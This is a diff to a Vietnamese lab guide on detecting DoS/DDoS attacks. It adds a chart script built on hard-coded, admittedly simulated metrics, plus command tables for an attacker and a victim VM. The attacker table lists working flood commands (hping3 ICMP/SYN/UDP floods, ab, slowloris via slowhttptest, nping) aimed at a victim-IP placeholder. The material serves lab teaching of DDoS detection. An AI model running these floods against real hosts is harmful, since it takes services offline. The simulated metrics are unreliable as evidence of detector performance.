+ax.set_title("ROC Curve — DoS/DDoS MLP Detector", fontweight="bold", fontsize=12)
+ax.legend(loc="lower right")
+ax.grid(alpha=0.3)
+ax.set_xlim(0, 1)
+ax.set_ylim(0, 1)
+
+plt.tight_layout()
+plt.savefig("chart6_roc_curve.png", bbox_inches="tight", dpi=150)
+print("[+] Saved: chart6_roc_curve.png")
+
+# ============================================================
+# CHART 7: Tổng hợp — 4 loại tấn công vs Normal (bar chart)
+# ============================================================
+fig, axes = plt.subplots(2, 2, figsize=(14, 10))
+
+attack_types = ["ICMP Flood", "SYN Flood", "UDP Flood", "HTTP Flood"]
+attack_pairs = [(0, 1), (2, 3), (4, 5), (6, 7)]
+metric_colors = ["#e74c3c", "#f39c12", "#9b59b6", "#e67e22"]
+normal_mean = np.mean(X_normal, axis=0)
+
+for idx, (ax, atype, (i1, i2)) in enumerate(zip(axes.flatten(), attack_types, attack_pairs)):
+    attack_mean = (X_attack[i1] + X_attack[i2]) / 2
+
+    x = np.arange(8)
+    width_bar = 0.35
+
+    ax.bar(x - width_bar / 2, normal_mean, width_bar, label="Normal",
+           color="#2ecc71", edgecolor="black", linewidth=0.3)
+    ax.bar(x + width_bar / 2, attack_mean, width_bar, label=f"{atype}",
+           color=metric_colors[idx], edgecolor="black", linewidth=0.3)
+
+    ax.set_xticks(x)
+    ax.set_xticklabels(feature_names, rotation=45, ha="right", fontsize=7)
+    ax.set_title(f"Normal vs {atype}", fontweight="bold", fontsize=11)
+    ax.legend(fontsize=8)
+    ax.grid(axis="y", alpha=0.3)
+
+fig.suptitle("Full Feature Comparison — Normal vs Each Attack Type",
+             fontsize=14, fontweight="bold", y=1.01)
+plt.tight_layout()
+plt.savefig("chart7_attack_type_comparison.png", bbox_inches="tight", dpi=150)
+print("[+] Saved: chart7_attack_type_comparison.png")
+
+# ============================================================
+# IN KẾT LUẬN
+# ============================================================
+print("\n" + "=" * 60)
+print("  KET QUA PHAN TICH (DU LIEU FIX CUNG)")
+print("=" * 60)
+print(f"  Accuracy  : {accuracy:.2%}")
+print(f"  Precision : {precision:.2%}")
+print(f"  Recall    : {recall:.2%}")
+print(f"  F1-Score  : {f1:.2%}")
+print(f"  ROC-AUC   : {roc_auc:.3f}")
+print("=" * 60)
+print("  Nhan xet:")
+print("  - Normal: entropy src_ip CAO (3.4-4.3) => nhieu nguon khac nhau")
+print("  - Attack: entropy src_ip THAP (0.12-1.5) => traffic tap trung")
+print("  - Attack: packet_count/byte_count CAO DOT BIEN so voi Normal")
+print("  - Protocol ratio giup phan biet LOAI tan cong (ICMP/SYN/UDP/HTTP)")
+print("=" * 60)
+PYEOF
+
+python3 chart_ddos_detection.py
+```
+
+### Output
+
+Script tạo ra **7 biểu đồ** trong thư mục hiện tại:
+
+| File | Nội dung |
 |------|----------|
-| Email đã dùng ở event khác | Reject: "Email already registered" |
-| Guest cố verify lại | Return current verified status |
-| OTP expired khi đang nhập | Prompt resend, không trừ attempt |
-| Phone thay đổi sau verified | Require re-verification |
+| `chart1_feature_comparison.png` | So sánh từng đặc trưng Normal vs Attack |
+| `chart2_entropy_radar.png` | Radar chart entropy 3 chiều |
+| `chart3_volume_timeline.png` | Packet/Byte count theo thời gian |
+| `chart4_protocol_ratio.png` | Tỷ lệ giao thức stacked bar |
+| `chart5_confusion_matrix.png` | Ma trận nhầm lẫn (kết quả giả lập) |
+| `chart6_roc_curve.png` | Đường cong ROC |
+| `chart7_attack_type_comparison.png` | So sánh chi tiết từng loại tấn công |
 
-> [!TIP]
-> **Chi tiết kỹ thuật đầy đủ:** Xem [implementation_plan.md](file:///C:/Users/admin/.gemini/antigravity/brain/92787526-c211-45a9-8eff-2e0fed3bdd01/implementation_plan.md)
-
----
-
-## 📎 Phụ lục
+**Không cần train** — tất cả số liệu đã fix cứng, chỉ cần chạy 1 lần là ra toàn bộ chart.
 
 ---
 
-> **Tài liệu này được tạo:** 2024-12-15  
-> **Phiên bản:** 1.1  
-> **Cập nhật:** Thêm Guest Verification System  
-> **Tác giả:** BA Analysis by Claude
+## TÓM TẮT LỆNH NHANH
+
+### Kali (Attacker)
+
+| STT | Mục đích | Lệnh |
+|-----|----------|------|
+| 0 | Setup | `sudo apt install hping3 nmap apache2-utils slowhttptest curl -y` |
+| 1 | Ping check | `ping -c 4 <victim-ip>` |
+| 2 | ICMP Flood | `sudo hping3 --icmp --flood <victim-ip>` |
+| 3 | SYN Flood | `sudo hping3 -S --flood -p 80 <victim-ip>` |
+| 4 | UDP Flood | `sudo hping3 --udp --flood -p 9999 <victim-ip>` |
+| 5 | HTTP GET Flood | `ab -n 500 -c 10 http://<victim-ip>/` |
+| 6 | Slowloris | `slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://<victim-ip>/ -x 24 -p 3` |
+| 7 | TCP Connect Flood | `sudo nping --tcp-connect -c 150 -p 80 --rate 50 <victim-ip>` |
+| 8 | Probe honeypot | `curl -v http://<victim-ip>/` ; `nmap -sV -p 80 <victim-ip>` |
+| 9 | Detect honeypot | `python3 detect_honeypot.py <victim-ip>` |
+| 10 | Chart detection | `python3 chart_ddos_detection.py` |
+
+### Ubuntu (Victim)
+
+| STT | Mục đích | Lệnh |
+|-----|----------|------|
+| 0 | Setup | `sudo apt install apache2 tcpdump wireshark ruby net-tools -y` |
+| 1 | Xem IP | `ifconfig` |
+| 2 | Monitor ICMP | `sudo tcpdump -i eth0 icmp -n` |
+| 3 | Monitor SYN | `sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -n` |
+| 4 | Monitor UDP | `sudo tcpdump -i eth0 'udp port 9999 or icmp' -n` |
+| 5 | Xem Apache log | `sudo tail -f /var/log/apache2/access.log` |
+| 6 | Đếm kết nối | `watch -n 1 "ss -tan \| grep ':80' \| wc -l"` |
+| 7 | Monitor TCP | `sudo tcpdump -i eth0 port 80 -n` |
+| 8 | Cài PentBox | Tải về → `sudo ruby pentbox.rb` → 2→3→1 |
+| 9 | Kiểm tra PentBox | `sudo ss -tlnp \| grep ':80'` |
